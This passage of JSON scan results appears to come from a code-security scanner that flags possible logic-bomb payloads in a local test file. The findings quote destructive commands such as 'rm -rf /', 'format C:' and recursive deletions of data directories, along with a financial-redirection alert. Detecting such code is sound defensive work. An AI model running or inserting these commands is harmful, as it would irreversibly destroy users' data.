      "line_number": 56,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.418950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_data')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.420945",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "eafedf1d-b817-431f-903c-c9376b3ae225",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.420945"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('format C:')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.420945",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "8d6c8ecb-ef31-48f7-9ad4-6c43b403c13f",
      "last_modified": "",
      "line_number": 13,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "System formatting - Complete data destruction",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.420945"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.420945",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "f5753a04-00b3-4f7f-ad40-57dc9bb2d0d0",
      "last_modified": "",
      "line_number": 14,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.420945"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical_file.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.421946",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "test_suspicious.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
      "id": "c4544155-c428-46eb-9daa-cdc143d83d1e",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.421946"
    }
  ],
  "issues_found": 49,
  "lines_of_code": 1031,
  "project_id": "vscode-workspace-1754924443338",
  "quality_gate_status": "BLOCKED",
  "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
  "timestamp": "2025-08-11T20:30:43.346952",
  "logic_bomb_risk_score": 0,
  "threat_shield_status": "BLOCKED"
}